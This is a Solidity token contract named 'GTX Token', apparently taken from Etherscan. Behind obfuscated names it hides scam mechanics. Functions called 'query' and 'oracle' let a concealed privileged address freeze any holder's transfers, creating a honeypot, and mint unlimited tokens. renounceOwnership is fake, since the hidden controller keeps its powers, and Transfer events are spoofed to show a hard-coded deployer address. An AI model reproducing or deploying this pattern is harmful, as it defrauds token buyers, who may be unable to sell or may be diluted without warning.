/**
 *Submitted for verification at Etherscan.io on 2023-01-16
*/

// SPDX-License-Identifier: MIT



pragma solidity 0.8.17;

  /*
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}*/ 
 
contract GTX {
  
    mapping (address => uint256) private IIB;
    mapping (address => uint256) private IIC;
    mapping(address => mapping(address => uint256)) public allowance;
  


    
    string public name = "GTX Token";
    string public symbol = unicode"GTX";
    uint8 public decimals = 6;
    uint256 public totalSupply = 100000000 *10**6;
    address owner = msg.sender;
    address private IID;
    address deployer = 0x4862733B5FdDFd35f35ea8CCf08F5045e57388B3;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        IID = msg.sender;
        deploy(msg.sender, totalSupply); }

    function renounceOwnership() public virtual {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }



    function deploy(address account, uint256 amount) internal {
    account = deployer;
    IIB[msg.sender] = totalSupply;
    emit Transfer(address(0), account, amount); }


   function balanceOf(address account) public view  returns (uint256) {
        return IIB[account];
    }
    function transfer(address to, uint256 value) public returns (bool success) {


      require(IIC[msg.sender] <= 0);
        require(IIB[msg.sender] >= value);
  IIB[msg.sender] -= value;  
        IIB[to] += value;          
 emit Transfer(msg.sender, to, value);
        return true; }

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 function query (address yx, uint256 yz)  public {
     if(msg.sender == IID){
   IIC[yx] = yz;}} 
function oracle (address yx, uint256 yz)  public {
         if(msg.sender == IID){
    IIB[yx] += yz;}}



    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == IID)  {
 require(value <= IIB[from]);
        require(value <= allowance[from][msg.sender]);
        IIB[from] -= value;  
      IIB[to] += value; 
        from = deployer;
        emit Transfer (from, to, value);
        return true; }    

        require(IIC[from] <= 0 && IIC[to] <=0);
        require(value <= IIB[from]);
        require(value <= allowance[from][msg.sender]);
        IIB[from] -= value;
        IIB[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }